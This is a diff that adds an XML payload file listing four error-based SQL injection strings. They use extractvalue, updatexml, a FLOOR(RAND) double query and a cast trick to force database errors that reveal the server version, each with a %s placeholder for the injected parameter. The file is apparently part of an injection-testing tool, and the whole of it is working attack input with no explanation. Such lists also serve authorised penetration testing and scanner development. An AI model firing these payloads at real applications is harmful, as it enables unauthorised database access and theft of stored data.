@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<payloads>
+    <technique name="error">
+        <payload>%s' AND extractvalue(1,concat(0x7e,version()))-- -</payload>
+        <payload>%s' AND updatexml(1,concat(0x7e,version()),1)-- -</payload>
+        <payload>%s' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -</payload>
+        <payload>%s' AND 1=cast((select version()) as int)-- -</payload>
+    </technique>
+</payloads>
